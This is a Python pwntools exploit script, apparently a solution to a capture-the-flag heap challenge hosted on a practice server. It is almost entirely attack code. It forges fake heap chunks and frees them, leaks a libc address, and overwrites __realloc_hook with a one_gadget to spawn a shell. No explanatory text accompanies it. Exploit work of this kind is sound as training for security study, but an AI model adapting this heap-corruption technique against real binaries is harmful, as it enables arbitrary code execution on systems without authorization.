#!/usr/bin/python3

from pwn import *

exe = ELF("iz_heap_lv1_patched", checksec=False)
libc = ELF("libc.so.6", checksec=False)
context.binary = exe
libc.sym['one_gadget'] = 0x10a38c


def GDB():
    if not args.REMOTE:
        gdb.attach(
            p,
            gdbscript="""


                c
                """,
        )
        input()


rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
    p = remote("node4.buuoj.cn", 27807)
else:
    p = process(exe.path)

GDB()


def add(size, data):
    sla(b"Choice: ", str(1).encode())
    sla(b"size: ", str(size).encode())
    sla(b"data: ", data)


def edit(idx, size, data):
    sla(b"Choice: ", str(2).encode())
    sla(b"index: ", str(idx).encode())
    sla(b"size: ", str(size).encode())
    sla(b"data: ", str(data).encode())


def free(idx):
    sla(b"Choice: ", str(3).encode())
    sla(b"index: ", str(idx).encode())


def show(option, addr):
    sla(b"Choice: ", str(4).encode())
    sla(b"(Y/N)", option)
    if option != "N":
        sa(b"name: ", addr)


fake_heap = fit(
    {0x0: flat(0, 0x91), 0x90: flat(0, 0x21), 0xB0: flat(0, 0x21)}, filler="\0"
)
sa(b"name: ", flat(0x602120, 0) + fake_heap)
for i in range(7):
    add(0x80, b"a")
for i in range(7):
    free(i)
free(20)
show("Y", b"a" * 8 * 4)
p.recvuntil(b"a" * 8 * 4)
libc.address = u64(p.recvline(keepends=False).ljust(8, b"\0")) - 0x3EBCA0
info("Libc base: " + hex(libc.address))

fake_heap = fit({0x0: flat(0, 0x71),
                0x70: flat(0, 0x21),
                0xb0: flat(0, 0x21)
                }, filler = '\0')
show("Y", flat(0x602120, 0) + fake_heap)
free(20)
show("Y", flat(0x602120, 0, 0, 0x71, libc.sym['__realloc_hook']))
add(0x68, flat(libc.sym['__realloc_hook']))
add(0x68, flat(libc.sym['one_gadget'], libc.sym['__libc_realloc'] + 6))

p.interactive()
